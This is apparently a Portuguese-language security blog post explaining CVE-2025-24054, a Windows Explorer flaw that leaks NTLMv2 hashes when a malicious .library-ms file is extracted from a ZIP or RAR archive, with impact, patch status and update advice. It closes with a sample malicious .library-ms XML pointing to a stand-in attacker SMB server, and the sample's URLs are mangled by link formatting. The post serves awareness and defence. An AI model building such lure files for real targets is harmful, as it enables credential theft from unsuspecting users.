---
title: "Alerta de Segurança: Vazamento de Hash NTLM (CVE-2025-24054) ao Extrair Arquivos ZIP/RAR"
date: 2025-05-31T15:00:00-03:00 # << AJUSTE ESTA DATA E HORA PARA A PUBLICAÇÃO
description: "Entenda a vulnerabilidade CVE-2025-24054 que permite o vazamento de hashes NTLMv2 através de arquivos .library-ms maliciosos em arquivos ZIP ou RAR e como a Microsoft a corrigiu."
keywords: ["CVE-2025-24054", "NTLM Hash Leak", "Windows Explorer", "Vulnerabilidade", "Segurança Windows", "ZIP", "RAR", ".library-ms", "Patch Tuesday"]
author: "Hugo Robot" # Seu nome de autor
images: ["images/posts/library-ms1.png"]
draft: false

tags: ["CVE", "Segurança Windows", "Vulnerabilidade", "NTLM", "Microsoft"]
categories: ["Segurança Cibernética", "Alertas"]
---

Recentemente, uma vulnerabilidade interessante (originalmente referenciada como CVE-2025-24071, agora atualizada para **CVE-2025-24054**) foi detalhada, expondo como hashes NTLMv2 de usuários do Windows podem ser capturados por invasores através de um método engenhoso envolvendo arquivos compactados ZIP ou RAR.

Vamos entender como essa falha funciona e o que foi feito a respeito.

## O Que é a Vulnerabilidade CVE-2025-24054?

A falha reside na maneira como o **Windows Explorer** lida com arquivos de Biblioteca do Windows (`.library-ms`) quando eles são extraídos de um arquivo compactado (como `.zip` ou `.rar`).



Um invasor pode criar um arquivo `.library-ms` malicioso que contém um caminho apontando para um servidor SMB (Server Message Block) sob seu controle. Quando um usuário desavisado baixa um arquivo ZIP/RAR contendo este arquivo `.library-ms` e o extrai, o Windows Explorer tenta automaticamente processar e indexar o conteúdo da "biblioteca".

Ao encontrar o caminho SMB malicioso dentro do arquivo `.library-ms`, o Windows Explorer tenta se conectar a esse servidor. Durante essa tentativa de conexão, ocorre um handshake de autenticação NTLM (NT LAN Manager), e o **hash NTLMv2** do usuário é enviado para o servidor SMB do invasor.

## Impacto do Vazamento de Hash NTLMv2

Com o hash NTLMv2 da vítima em mãos, um invasor pode:

* **Tentar ataques de "Pass-the-Hash":** Em ambientes de rede corporativa, esses hashes podem ser usados para se autenticar em outros sistemas como se fosse o usuário legítimo, sem a necessidade de conhecer a senha original.
* **Tentar Quebra de Senha Offline:** O hash NTLMv2 pode ser submetido a ferramentas de cracking para tentar descobrir a senha de texto puro do usuário. A força da senha e a capacidade computacional do invasor influenciam o sucesso dessa tentativa.

## Sistemas Afetados

A vulnerabilidade afeta o **Windows Explorer** em versões do Windows que processam automaticamente arquivos `.library-ms`.

## Correção e Mitigação

A boa notícia é que a **Microsoft já corrigiu esta vulnerabilidade**. A correção foi disponibilizada no "Patch Tuesday" de Março. É crucial que os usuários do Windows mantenham seus sistemas atualizados com os últimos patches de segurança da Microsoft para se protegerem contra esta e outras ameaças.

Portanto, a principal recomendação é:
* **Aplique todas as atualizações de segurança do Windows o mais rápido possível.**

Manter-se informado sobre essas vulnerabilidades e aplicar as correções diligentemente são passos fundamentais para a segurança digital.

# Como o Ataque Funciona: O Apontamento SMB Malicioso
- 1. **Criação do Arquivo Malicioso**: Um invasor cria um arquivo `library-ms` especialmente modificado. Dentro deste arquivo XML, ele especifica um caminho para um local de rede que aponta para um servidor SMB sob seu controle.

    - **O que é SMB (Server Message Block)**? De forma rápida, SMB é um protocolo de rede usado principalmente pelo Windows para compartilhamento de arquivos, impressoras e outros recursos em uma rede. Quando você acessa uma pasta compartilhada como `\\NOMEDOSERVIDOR\pasta`, você está usando SMB.
- 2. Exemplo de Conteúdo Malicioso no `.library-ms`:
O arquivo `library-ms` pode conter algo como:

```javascript
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="[http://schemas.microsoft.com/windows/2009/library](http://schemas.microsoft.com/windows/2009/library)">
    <name>Fotos Inocentes</name>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <simpleLocation>
                <url>file://///[servidor-do-atacante.com/recurso_malicioso](https://servidor-do-atacante.com/recurso_malicioso)</url>
                {{/* Outra variação poderia ser: <url>\\servidor-do-atacante.com\recurso_malicioso</url> */}}
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```
---

